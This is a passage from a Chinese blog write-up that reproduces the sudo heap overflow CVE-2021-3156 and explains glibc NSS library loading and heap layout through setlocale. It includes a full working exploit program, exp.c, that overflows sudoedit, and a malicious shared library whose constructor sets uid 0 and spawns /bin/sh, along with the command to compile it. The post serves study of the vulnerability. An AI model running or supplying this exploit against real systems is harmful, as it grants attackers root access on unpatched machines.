+                                    ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>
+                          <span class="token string">".so"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                __nss_shlib_revision<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token comment">/* Failed to load the library.  */</span>
+          ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1l</span><span class="token punctuation">;</span>
+          <span class="token function">__set_errno</span> <span class="token punctuation">(</span>saved_errno<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifdef</span> <span class="token expression">USE_NSCD</span></span>
+      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>is_nscd<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token comment">/* Call the init function when nscd is used.  */</span>
+          <span class="token class-name">size_t</span> initlen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>name<span class="token punctuation">)</span>
+                            <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span><span class="token string">"_init"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">char</span> init_name<span class="token punctuation">[</span>initlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
+          <span class="token comment">/* Construct the init function name.  */</span>
+          <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>init_name<span class="token punctuation">,</span>
+                                        <span class="token string">"_nss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                              ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>
+                    <span class="token string">"_init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment">/* Find the optional init function.  */</span>
+          <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>ifct<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">traced_file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token operator">=</span> <span class="token function">__libc_dlsym</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle<span class="token punctuation">,</span> init_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>ifct <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+              <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>cb<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">traced_file</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> nscd_init_cb<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">ifdef</span> <span class="token expression">PTR_DEMANGLE</span></span>
+              <span class="token function">PTR_DEMANGLE</span> <span class="token punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">endif</span></span>
+              <span class="token function">ifct</span> <span class="token punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最主要的是，当 <code>ni-&gt;library-&gt;lib_handle == NULL</code> 成立后，会执行 <code>dlopen</code> 加载动态链接库：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+      <span class="token keyword">char</span> shlib_name<span class="token punctuation">[</span>shlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token comment">/* Construct shared object name.  */</span>
+      <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">,</span>
+                                              <span class="token string">"libnss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                                    ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>
+                          <span class="token string">".so"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                __nss_shlib_revision<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>前面有 <code>ni-&gt;library == NULL</code> 时执行 <code>nss_new_service</code> 返回的 <code>library-&gt;lib_handle</code> 就是 NULL</p>
+<p>且 service_user 结构体刚好在堆上，只要溢出覆盖一个 service_user 结构体，伪造 <code>name</code> 字段为 <code>X/X</code>，<code>library</code> 字段为 NULL，那么后续调用 <code>nss_load_library</code> 时就会调用 <code>__libc_dlopen(&quot;libnss_X/X.so.xx&quot;)</code> 加载自己写的动态链接库 </p>
+<p>只要动态链接库写个 constructor 函数，执行 shell，即可提权</p>
+<p>这里有一点，大部分文章都没提到（也可能是默认大家都知道了）：<strong>为什么一定要覆盖 <code>name</code> 成 <code>X/X</code> 的形式，而不是 <code>X</code> 的形式？</strong></p>
+<p>这可以从 dlopen 的 man 手册中找到答案：</p>
+<pre class="line-numbers language-none"><code class="language-none">......
+       If filename is NULL, then the returned handle is for the main program.  If filename contains a slash (&quot;&#x2F;&quot;), then it is
+       interpreted as a (relative or absolute) pathname.  Otherwise, the dynamic linker searches for the  object  as  follows
+       (see ld.so(8) for further details):
+
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>大概意思是，filename 参数只有存在 <code>/</code> 的时候，才会有可能被当作相对路径，没有 <code>/</code> 的时候，会去 PATH 等环境变量指向的地方找对应的库文件，为了方便，使用相对路径的方式，所以使用 <code>X/X</code> 的形式</p>
+<h3 id="service-user-结构体分布"><a href="#service-user-结构体分布" class="headerlink" title="service_user 结构体分布"></a>service_user 结构体分布</h3><p>gdb 上使用 <code>search -s systemd</code> 可以找到 service_user 等结构体</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-7.png" alt="service_user"></p>
+<p>可以看到 passwd 的 name_database_entry，的 <code>service</code> 字段指向了一条链表，链表上是 <code>files</code> -&gt; <code>systemd</code> 的 service_user 结构体</p>
+<p>那么只要覆盖这两个 service_user 中的一个就可以了，覆盖后面的 service_user 可能会同时把前面的 service_user 也覆盖了，破坏了链表就不行了，所以选择覆盖前面的那个 service_user，同时不能把前面的 name_database_entry 结构体也破坏了</p>
+<p>实际情况下，在漏洞点之前会先后从堆上分配下面这些结构体：</p>
+<pre class="line-numbers language-none"><code class="language-none">passwd(name_database_entry)
+files(service_user)
+systemd(service_user)
+group(name_database_entry)
+files(service_user)
+systemd(service_user)
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>只要 user_args 位于 name_database_entry 和 service_user 之间，即可覆盖 service_user 而不会破坏 name_database_entry 了</p>
+<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><p>通过调试发现，在我的复现环境下，一般情况下 user_args 都位于 service_user 之后，根据目前公开的方式，利用程序开头的 setlocale 函数，对 <code>LC_MESSAGES</code>，<code>LC_ALL</code> 等环境变量，都会有多次的堆块分配与释放，影响堆块布局的情况，使得 user_args 分配时，得到的刚好是 setlocale 中 free 进 tcache 的 chunk，因为 setlocale 函数的调用在 service_user 等结构体分配之前，那么 user_args 就能分布在 service_user 结构体之前</p>
+<p>比如，环境变量使用 <code>LC_ALL=C.UTF-8@AAAA</code>，<code>@</code> 字符后面的 <code>AAAA</code> 将会在 setlocale 里分配 chunk 进行存储，之后会释放</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>经过多次测试，exp 如下，下面使用这个 exp 进行一下调试，说明为什么要这么写：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//exp.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_ENVP</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LC_ENV1</span> <span class="token string">"LC_ALL=C.UTF-8@"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LC_ENV2</span> <span class="token string">"LC_CTYPE=C.UTF-8@"</span></span>
+
+<span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span>MAX_ENVP<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+        <span class="token keyword">char</span> paddingA<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>paddingA<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        paddingA<span class="token punctuation">[</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
+        <span class="token keyword">char</span> <span class="token operator">*</span>s_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+                <span class="token string">"sudoedit"</span><span class="token punctuation">,</span> <span class="token string">"-s"</span><span class="token punctuation">,</span> paddingA<span class="token punctuation">,</span> <span class="token constant">NULL</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xb10</span><span class="token operator">-</span><span class="token number">0x190</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"x/i4oyu"</span><span class="token punctuation">;</span> <span class="token comment">//name</span>
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"AAA"</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">char</span> <span class="token operator">*</span>LC1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">strcpy</span><span class="token punctuation">(</span>LC1<span class="token punctuation">,</span> LC_ENV1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/*
+        char *LC2 = calloc(0x1000, 1);
+        strcpy(LC2, LC_ENV2);
+        memset(LC2 + sizeof(LC_ENV2) - 1, 'Y', 0x90);
+        */</span>
+
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> LC1<span class="token punctuation">;</span>
+        <span class="token comment">//envp[envp_pos++] = LC2;</span>
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                                                                    
+        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/path/to/sudoedit"</span><span class="token punctuation">,</span> s_argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//execve("/usr/bin/sudoedit", s_argv, envp);</span>
+
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先看到这里</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token keyword">char</span> <span class="token operator">*</span>LC1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">strcpy</span><span class="token punctuation">(</span>LC1<span class="token punctuation">,</span> LC_ENV1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调试来到 user_args 分配前，查看 heap 情况，存储 0xc0 个 <code>X</code> 的 chunk 在这里：</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-8.png" alt="heap"></p>
+<p>同时也可以看到，这个 chunk 的大小并不是 0xc0，而是比 0xc0 要大得多的 0x1a0，和参考的一些文章的说法不太一样</p>
+<p>同时可以看到这个 0x1a0 的 chunk 位于 name_database_entry 和 service_user 之间：</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-9.png" alt="user_args_chunk"></p>
+<p><strong>注意</strong>：实际上 <code>set_cmnd</code> 调用后，会从 group 的 name_database_entry 开始查找 service_user 结构体进行 <code>nss_load_library</code> 的调用，所以图中使用的是 group 的链</p>
+<p>exp 这里的 0x190-2 就是为了控制命令行参数的长度，使得 user_args 的分配调用 <code>malloc(0x190)</code> 从而分配到上面提到的 chunk：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token keyword">char</span> paddingA<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token function">memset</span><span class="token punctuation">(</span>paddingA<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        paddingA<span class="token punctuation">[</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>溢出点到要覆盖 service_user 的偏移为 +0xb10：</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-10.png" alt="len"></p>
+<p>命令行参数本身有 0x190-1 长的数据复制进了 to，那么只需要连续 <code>0xb10 - 0x190 + 1</code> 多的反斜杠即可连续写入 <code>\0</code>，直到目标 service_user 结构体，再继续覆写 0x30 长度的数据，即可到达 <code>name</code> 字段，这就是对下面这部分代码的解释：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xb10</span><span class="token operator">-</span><span class="token number">0x190</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"x/i4oyu"</span><span class="token punctuation">;</span> <span class="token comment">//name</span>
+        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"AAA"</span><span class="token punctuation">;</span>
+   
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>这里覆盖 <code>name</code> 为 <code>x/xi4oyu</code>，那么需要编译一个动态链接库 <code>libnss_x/xi4oyu.so.2</code> ，代码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//mkdir libnss_x &amp;&amp; gcc -fPIC -shared -o 'libnss_x/i4oyu.so.2' xi4oyu.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+ 
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!!!] pwn!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"PATH=/bin:/usr/bin:/sbin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>利用成功！</p>
+<p><img src="/images/CVE-2021-3156/CVE-2021-3156-11.png" alt="pwn"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>堆布局的方式比较复杂，其中这一句：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>至于 0xc0 这个值是怎么来的？本人是 <strong>从 0 开始间隔 0x10 递增</strong>，观察堆的情况，一步步地测出来的</p>
+<p>目前公开的文章也并没有做一个很好的解释，具体怎么回事，还是得跟踪调试 setlocale 的每一次 malloc 和 free 的调用了，写得比较好的 exp 是 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/blasty/CVE-2021-3156">blasty</a> 的 exp，其中提供了一个爆破脚本，就是为了测出这个合适的值</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我接触的第一个 CVE，漏洞原理相对还是比较简单的，从中也学到了 <strong>NSS</strong> 这个十分有意思的机制</p>
+<p>最近在学 v8 的漏洞利用，下一次复现的就是 v8 的 CVE 了，加油！</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ama2in9.top/2021/02/04/cve-2021-3156/">https://ama2in9.top/2021/02/04/cve-2021-3156/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/zyeCBsLNRVdg2ckFnOXENg">https://mp.weixin.qq.com/s/zyeCBsLNRVdg2ckFnOXENg</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/231077">https://www.anquanke.com/post/id/231077</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/18f36f1342b3">https://www.jianshu.com/p/18f36f1342b3</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8">https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>feather
